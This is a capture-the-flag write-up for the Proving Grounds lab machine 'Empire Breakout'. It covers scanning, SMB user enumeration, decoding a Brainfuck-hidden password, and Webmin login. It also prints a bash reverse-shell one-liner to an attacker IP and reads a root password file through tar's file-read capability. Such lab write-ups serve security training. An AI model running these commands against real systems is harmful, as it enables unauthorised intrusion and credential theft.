---
layout: default
title: Empire Breakout
parent: Proving Grounds Play
nav_order: 13
---

# Scanning

---

```bash

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/empire-breakout]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.226.238
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 22:04 EST
Nmap scan report for 192.168.226.238
Host is up (0.062s latency).
Not shown: 65527 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-server-header: MiniServ/1.981
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
|_http-server-header: MiniServ/1.830

Host script results:
| smb2-time:
|   date: 2023-11-07T03:05:40
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 17s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.04 seconds

```

# Enumeration

---

## 445 | SMB

Enumerate the SMB service with _Enum4linux_ and discover a local user _cyber_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/empire-breakout]
└─$ enum4linux -U 192.168.226.238
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Nov  7 21:48:
19 2023

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\cyber (Local User)

```

## 80 | HTTP

Running Apache.
Gobuster scan doesn't return anything useful.
Checking the source code we find some text at the bottom of the page:

```bash
!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->
```

Use dcode.fr to analyze the text and it determines it is encoded with the Brainfuck cipher.

![decode1](../../../assets/images/ctfs/proving_grounds/empire-breakout/decode1.png)

Decoding we get a string that looks like a possible password:

![decode2](../../../assets/images/ctfs/proving_grounds/empire-breakout/decode2.png)

Discovered password: .2uqPEfj3D<P'a-3
{: .warn }

## 20000 | HTTP

We are able to authenticate with the _cyber_ user discovered with SMB enumeration and the password decoded from the Apache web page
source code.

![logon](../../../assets/images/ctfs/proving_grounds/empire-breakout/logon.png)

# Exploitation

## Reverse Shell from Webmin Web Terminal

Once authenticated to the Webmin Miniserv running on port 20000 we find a terminal icon in the Usermin admin panel.

![terminal](../../../assets/images/ctfs/proving_grounds/empire-breakout/terminal.png)

We enter the following bash one-liner in the terminal and get a reverse shell on our netcat listener.

```bash
bash -i >& /dev/tcp/192.168.45.217/80 0>&1
```

![bash](../../../assets/images/ctfs/proving_grounds/empire-breakout/bash.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/empire-breakout]
└─$ netcat -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.226.238] 51512
bash: cannot set terminal process group (6028): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$ id
id
uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
cyber@breakout:~$

```

---

# Post-Exploitation

---

## Check for Extended Capabilities

```bash
cyber@breakout:~$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep

```

_Tar_ has cap_dac_read_search capabilities.
This extended capability allows us to read access to anything.
This could be used to read restricted files such as /etc/shadow in order to display password hashes.

When running _linpeas_ we see there is a _/var/backups/.old_pass.bak_ that we can try to read with the _Tar_ binary.

![backup](../../../assets/images/ctfs/proving_grounds/empire-breakout/backup.png)

```bash
cyber@breakout:~$ ./tar -cvf old_pass /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
/var/backups/.old_pass.bak
cyber@breakout:~$ ./tar -xvf old_pass
var/backups/.old_pass.bak
cyber@breakout:~$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
```

Root password discovered: Ts&4&YurgtRX(=~h
{: .warn }
